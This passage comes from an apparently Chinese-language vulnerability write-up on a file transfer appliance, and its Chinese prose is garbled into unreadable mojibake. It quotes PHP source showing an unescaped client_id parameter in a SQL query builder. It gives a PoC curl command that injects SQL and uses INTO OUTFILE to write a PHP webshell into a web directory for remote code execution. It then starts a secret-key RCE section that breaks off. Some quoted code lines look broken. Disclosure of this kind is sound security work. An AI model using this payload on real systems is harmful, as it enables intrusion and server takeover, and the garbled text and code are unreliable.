&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mysql_select_db&lt;/code&gt; ‰∏≠ÊâÄÈñãÂïüË≥áÊñôÂ∫´ÁöÑÂêçÁ®±Áî±‰ΩøÁî®ËÄÖÂèØÊéßÔºåÂ¶ÇÁµ¶ÈåØË™§ÁöÑÂÄºÂ∞áÂ∞éËá¥Á®ãÂºèÁÑ°Ê≥ïÁπºÁ∫åÂü∑Ë°å‰∏ãÂéªÔºåÊâÄ‰ª•ÂøÖÈ†àÂ∞á &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$g_app_id&lt;/code&gt; ÂÅΩÈÄ†ÊàêÊ≠£Á¢∫ÁöÑÂÖßÂÆπ„ÄÇ&lt;/p&gt;

&lt;p&gt;Êé•ËëóÊòØÊúÄ‰∏ªË¶ÅÁöÑÂáΩÊï∏ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;client_properties( $client_id )&lt;/code&gt;&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;client_properties&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$client_id&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$user&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$manager&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$client_type&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$client_name&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$order_by&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;client_id&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$order_type&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;a&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$limit&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$offset&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$exclude_del&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$user_type&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$user_status&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$sql&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$user_type&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;?&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;SELECT t_mail_server.* FROM t_mail_server &apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;SELECT t_mail_server.*, t_profile.c_flag as profile_flag FROM t_mail_server, t_profile &apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;client_id&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$client_id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;client_name&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$client_name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;client_type&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$client_type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;user&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;mysql_escape_like&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$user&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;user_type&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$user_type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;manager&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$manager&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;user_status&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$user_status&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$sql&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;construct_where_clause&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$exclude_del&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;// ...&lt;/span&gt;

    &lt;span class=&quot;nv&quot;&gt;$result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;  &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;mysql_query&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$sql&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$db_result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;fatal_error&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;exec:mysql_query(&apos;&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$sql&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;) respond:&apos;&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;mysql_error&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;  &lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;__FILE__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;221&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;construct_where_clause&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$exclude_del&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$where_clause&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;  &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$where_clause&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;c_server_id  != \&apos;999\&apos;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$exclude_del&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$where_clause&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;!(t_mail_server.c_flag &amp;amp; &apos;&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;CLIENT_DELETED&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;)&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;client_id&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$where_clause&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;c_server_id = \&apos;&apos;&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;client_id&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;\&apos;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;manager&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;manager&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;mysql_real_escape_string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;manager&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$where_clause&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;c_manager = \&apos;&apos;&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;manager&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;\&apos;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;client_name&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;client_name&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;mysql_real_escape_string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;client_name&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$where_clause&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;t_mail_server.c_name LIKE \&apos;%&apos;&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;client_name&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;%\&apos;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;user&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;user&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;%%&apos;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;user&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;mysql_real_escape_string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;user&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$where_clause&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;t_mail_server.c_user_id LIKE \&apos;&apos;&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;user&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;\&apos;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;client_properties( ... )&lt;/code&gt; ‰∏≠ÊúÉÂ∞áÊâÄÂÇ≥ÈÄ≤ÁöÑÂèÉÊï∏ÈÄ≤Ë°å SQL Ë™ûÂè•ÁöÑÊãºË£ùÔºåËÄå &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;construct_where_clause( ... )&lt;/code&gt; ÁÇ∫ÊúÄÈóúÈçµÁöÑ‰∏ÄÂÄãÂáΩÊï∏„ÄÇ
Âú® &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;construct_where_clause( ... )&lt;/code&gt; ‰∏≠ÂèØ‰ª•ÁúãÂà∞ÂèÉÊï∏ÁöÜ‰ΩøÁî® &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mysql_real_escape_string&lt;/code&gt; ‰æÜÈò≤Á¶¶‰ΩÜÂîØÁç®Áº∫Â∞ë &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$client_id&lt;/code&gt;ÔºåÂæûÂéüÂßãÁ¢ºÁöÑ Coding Style ËßÄÂØüÁåúÊ∏¨ÊáâË©≤ÊòØÈñãÁôºÊôÇÁöÑÁñèÂøΩÔºåÂõ†Ê≠§Ê†πÊìöÁ®ãÂºèÊµÅÁ®ãÈÄÅÂá∫Â∞çÊáâÁöÑÂèÉÊï∏Âç≥ÂèØËß∏Áôº SQL Injection„ÄÇ&lt;/p&gt;

&lt;p&gt;Ê≠§Â§ñÔºåÂú® FTA ‰∏≠Ë≥áÊñôÂ∫´‰ΩøÁî®ËÄÖÁÇ∫ root ÂÖ∑Êúâ FILE_PRIV Ê¨äÈôêÔºåÂõ†Ê≠§ÂèØ‰ΩøÁî® &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;INTO OUTFILE&lt;/code&gt; Êí∞ÂØ´Ëá™Â∑± PHP ‰ª£Á¢ºËá≥ÂèØÂØ´ÁõÆÈåÑÈÅîÊàêÈÅ†Á´Ø‰ª£Á¢ºÂü∑Ë°åÔºÅ&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;PoC&lt;/strong&gt;&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl https://&amp;lt;fta&amp;gt;/courier/1000@/security_key2.api &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;aid=1000&amp;amp;user_id=1&amp;amp;password=1&amp;amp;client_id=&apos; OR 1=1 LIMIT 1 INTO OUTFILE &apos;/home/seos/courier/themes/templates/.cc.php&apos; LINES TERMINATED BY 0x3c3f...#&quot;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;ÁîüÊàêÁöÑ PHP Ê™îÊ°à‰ΩçÁΩÆÂú®&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;http://&amp;lt;fta&amp;gt;/courier/themes/templates/.cc.php&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h4 id=&quot;known-secret-key-leads-to-remote-code-execution&quot;&gt;Known Secret-Key leads to Remote Code Execution&lt;/h4&gt;

&lt;p&gt;Âú®ÂâçÂÄãÂº±Èªû‰∏≠ÔºåË¶ÅÈÅîÊàêÈÅ†Á´Ø‰ª£Á¢ºÂü∑Ë°åÈÇÑÊúâ‰∏ÄÂÄãÊ¢ù‰ª∂ÊòØË¶ÅÂ≠òÂú®ÂèØÂØ´ÁõÆÈåÑÔºå‰ΩÜÁèæÂØ¶‰∏≠ÊúâÊ©üÁéáÊâæ‰∏çÂà∞ÂèØÂØ´ÁöÑÁõÆÈåÑÊîæÁΩÆ WebshellÔºåÂõ†Ê≠§ÁÑ°Ê≥ïÂæû SQL Injection ÈÅîÊàê‰ª£Á¢ºÂü∑Ë°åÔºå‰∏çÈÅéÈÄôÊôÇÊúâÂè¶Â§ñ‰∏ÄÊ¢ùË∑ØÂèØ‰ª•Âπ´Âä©ÊàëÂÄëÈÅîÊàêÈÅ†Á´Ø‰ª£Á¢ºÂü∑Ë°å„ÄÇ&lt;/p&gt;

&lt;p&gt;ÈÄôÂÄãÂº±ÈªûÁöÑÂâçÊèêÊ¢ù‰ª∂ÊòØ &lt;strong&gt;Â∑≤Áü•Ë≥áÊñôÂ∫´‰∏≠ÊâÄÂ≠òÁöÑÂä†ÂØÜ KEY&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;ÈÄôÈªûÂ∞çÊàëÂÄë‰æÜË™™‰∏çÊòØÂïèÈ°åÔºåÂæûÂâçÈù¢ÁöÑ SQL Injection Âº±ÈªûÂèØ‰ªªÊÑèËÆÄÂèñË≥áÊñôÂ∫´ÂÖßÂÆπÔºåÂè¶Â§ñÈõñÁÑ∂Âú®Á®ãÂºèÁ¢º‰∏≠ÊúâÂ∞çÂèÉÊï∏ÈÄ≤Ë°å‰∏Ä‰∫õÈÅéÊøæÔºå‰ΩÜÈÇ£‰∫õÈÅéÊøæÊòØÂèØ‰ª•ÁπûÈÅéÁöÑÔºÅ&lt;/p&gt;

&lt;div class=&quot;highlight-name&quot;&gt;/home/seos/courier/sfUtils.api&lt;/div&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$func_call&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;decrypt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;fc&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
